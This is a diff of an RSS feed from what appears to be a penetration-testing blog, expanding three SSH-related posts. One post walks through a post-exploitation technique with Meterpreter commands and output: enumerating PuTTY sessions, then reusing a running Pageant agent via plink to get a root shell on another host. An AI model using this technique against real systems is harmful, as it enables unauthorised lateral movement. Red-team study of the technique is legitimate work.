@@ -8,7 +8,7 @@
     <language>en-us</language>
     <lastBuildDate>Tue, 28 Aug 2012 15:42:03 +0000</lastBuildDate>
     
-	<atom:link href="https://malicious.link/categories/ssh/index.xml" rel="self" type="application/rss+xml" />
+        <atom:link href="https://malicious.link/categories/ssh/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
@@ -17,8 +17,41 @@
       <pubDate>Tue, 28 Aug 2012 15:42:03 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-08-28-free-shells-with-plink-and-pageant/</guid>
-      <description>Watching Egypt’s talk at DEFCON 20 he mentioned the ability to jump on on a system when pageant (puTTY’s ssh-agent equivalent) is running. So I wanted to figure out the best way to get this going. Here is what I came up with:
-meterpreter &amp;gt; run enum_putty [*] Putty Installed for [[&amp;quot;Administrator&amp;quot;]] [*] Saved SSH Server Public Keys: [*] rsa2@22:172.16.10.150 [*] Session corp_webserver: [*] Protocol: SSH [*] Hostname: 172.16.10.150 [*] Username: root [*] Public Key: meterpreter &amp;gt;  Awesome, this guy runs as root and we have the IP address.</description>
+      <description>&lt;p&gt;Watching &lt;a href=&#34;http://twitter.com/egyp7&#34;&gt;Egypt&lt;/a&gt;’s talk at DEFCON 20 he mentioned the ability to jump on on a system when pageant (puTTY’s ssh-agent equivalent) is running. So I wanted to figure out the best way to get this going. Here is what I came up with:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; run enum_putty
+[*] Putty Installed for [[&amp;quot;Administrator&amp;quot;]]
+[*] Saved SSH Server Public Keys:
+[*]     rsa2@22:172.16.10.150
+[*] Session corp_webserver:
+[*]     Protocol: SSH
+[*]     Hostname: 172.16.10.150
+[*]     Username: root
+[*]     Public Key:
+meterpreter &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Awesome, this guy runs as root and we have the IP address. But it doesn’t have any public keys listed. That’s ok because Pageant is running.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; shell
+Process 3364 created.
+Channel 1 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Program Files\PuTTY&amp;gt;plink -agent root@172.16.10.150
+plink -agent root@172.16.10.150
+Welcome to Ubuntu 12.04 LTS (GNU/Linux 2.6.39.1-34 i686)
+No mail.
+Last login: Tue Aug 28 14:15:18 2012 from 172.16.10.100
+root@172.16.10.150:~]$ id
+uid=0(root) gid=0(root) groups=0(root)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;w00t! An extra shell for free!!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201208_freeshells_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+</description>
     </item>
     
     <item>
@@ -27,8 +60,15 @@ meterpreter &amp;gt; run enum_putty [*] Putty Installed for [[&amp;quot;Administ
       <pubDate>Thu, 15 Sep 2011 18:10:33 +0000</pubDate>
       
       <guid>https://malicious.link/post/2011/2011-09-15-disconnect-stalled-ssh-session/</guid>
-      <description>This doesn&amp;rsquo;t really apply to Windows users as you can just close puTTy. But for everyone else, stalled SSH Sessions suck. You are either slamming enter to get it to realize it&amp;rsquo;s been disconnected or just waiting for it to. Well, for those of us who are impatient just hit:
-~.  Thats right, SHIFT + the key above TAB, release, and hit the period. You may have to hit ENTER first to clear the buffer or whatever it does, but do that and it will disconnect the SSH session right away.</description>
+      <description>&lt;p&gt;This doesn&amp;rsquo;t really apply to Windows users as you can just close puTTy. But for everyone else, stalled SSH Sessions suck. You are either slamming enter to get it to realize it&amp;rsquo;s been disconnected or just waiting for it to. Well, for those of us who are impatient just hit:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;~.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thats right, SHIFT + the key above TAB, release, and hit the period. You may have to hit ENTER first to clear the buffer or whatever it does, but do that and it will disconnect the SSH session right away.&lt;/p&gt;
+
+&lt;p&gt;Stupid trick, but I use it all the time (especially on shotty MiFi connections).&lt;/p&gt;
+</description>
     </item>
     
     <item>
@@ -37,10 +77,14 @@ meterpreter &amp;gt; run enum_putty [*] Putty Installed for [[&amp;quot;Administ
       <pubDate>Sun, 05 Dec 2010 06:58:28 +0000</pubDate>
       
       <guid>https://malicious.link/post/2010/2010-12-05-offensive-and-defensive-ssh-patching-at-nova-hackers/</guid>
-      <description>This is definitely not my content, but I did want to highlight the talk Nicholas [1] gave at NoVA Hackers [2] this last November.
-Nicholas B. gives a talk about SSH Patching for Offensive and Defense at NoVa Hackers November 2010
-[1] http://twitter.com/nberthaume
-[2] http://novahackers.blogspot.com/2010/10/november-meeting-monday-nov-15th-2010.html</description>
+      <description>&lt;p&gt;This is definitely not my content, but I did want to highlight the talk Nicholas [1] gave at NoVA Hackers [2] this last November.&lt;/p&gt;
+
+&lt;p&gt;Nicholas B. gives a talk about SSH Patching for Offensive and Defense at NoVa Hackers November 2010&lt;/p&gt;
+
+&lt;p&gt;[1] &lt;a href=&#34;http://twitter.com/nberthaume&#34;&gt;http://twitter.com/nberthaume&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;[2] &lt;a href=&#34;http://novahackers.blogspot.com/2010/10/november-meeting-monday-nov-15th-2010.html&#34;&gt;http://novahackers.blogspot.com/2010/10/november-meeting-monday-nov-15th-2010.html&lt;/a&gt;&lt;/p&gt;
+</description>
     </item>
     
   </channel>
